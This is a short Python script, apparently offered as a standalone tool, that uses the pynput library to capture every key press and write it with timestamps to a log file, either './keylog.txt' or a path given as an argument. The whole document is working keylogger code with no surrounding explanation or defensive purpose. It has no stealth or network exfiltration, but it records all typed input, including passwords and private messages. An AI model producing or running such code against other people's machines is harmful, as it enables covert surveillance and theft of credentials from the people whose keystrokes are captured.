from pynput.keyboard import Key, Listener
import logging, sys

filePath = "./keylog.txt"
if len(sys.argv) > 1:
    filePath = sys.argv[1]

logging.basicConfig(filename=(filePath), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener :
    listener.join()